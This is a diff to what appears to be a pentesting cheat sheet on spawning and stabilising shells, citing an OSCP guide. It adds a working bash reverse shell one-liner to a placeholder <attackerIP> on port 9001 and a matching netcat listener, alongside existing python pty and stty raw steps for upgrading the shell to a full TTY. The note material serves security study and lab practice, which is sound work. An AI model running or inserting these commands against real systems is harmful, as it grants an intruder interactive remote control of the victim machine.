@@ -1,3 +1,12 @@
+
+```
+bash -c 'bash -i >& /dev/tcp/<attackerIP>/9001 0>&1'
+```
+
+```
+nc -lvnp 9001
+```
+
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -10,6 +19,7 @@ CTRL + Z
 stty raw -echo
 fg
 <return>
+export TERM=xterm
 
 https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html
 
